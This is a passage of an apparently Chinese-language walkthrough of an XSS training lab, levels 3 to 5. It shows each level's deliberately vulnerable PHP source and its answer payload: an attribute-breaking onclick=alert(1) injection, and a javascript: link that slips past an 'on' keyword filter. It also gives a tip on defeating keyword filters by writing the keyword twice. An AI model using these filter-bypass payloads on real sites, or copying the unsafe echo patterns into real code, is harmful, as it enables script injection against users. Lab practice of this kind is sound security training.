&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level4.php?keyword&#x3D;try harder!&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level3&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level3&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; $_GET[&quot;keyword&quot;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;form action&#x3D;level3.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;center&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level3.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 4&lt;&#x2F;p&gt;
&lt;p&gt;与Level 3相同，注意使用的是双引号即可&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202145526384.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202145526384.png&quot; alt&#x3D;&quot;image-20240202145526384&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot; onclick&#x3D;&quot;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level4.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level4.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 5&lt;&#x2F;p&gt;
&lt;p&gt;本题在先前基础上过滤了关键字 on ，使得所有带on的方法都不可使用，故使用伪协议构造&lt;a href&#x3D;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;若过滤是被替换为空，则可进行双写绕过，若是增加下划线等破坏原有结构则需使用其他方法绕过&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;e51d1669fc381c1c00e22113b0f8bea.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;e51d1669fc381c1c00e22113b0f8bea.png&quot; alt&#x3D;&quot;e51d1669fc381c1c00e22113b0f8bea&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot;&gt;&lt;a href&#x3D;&quot;[javascript:alert(1)](about:blank)&quot;&gt;123&lt;&#x2F;a&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;，其中&#x2F;&#x2F;为注释后面的内容&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level5.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 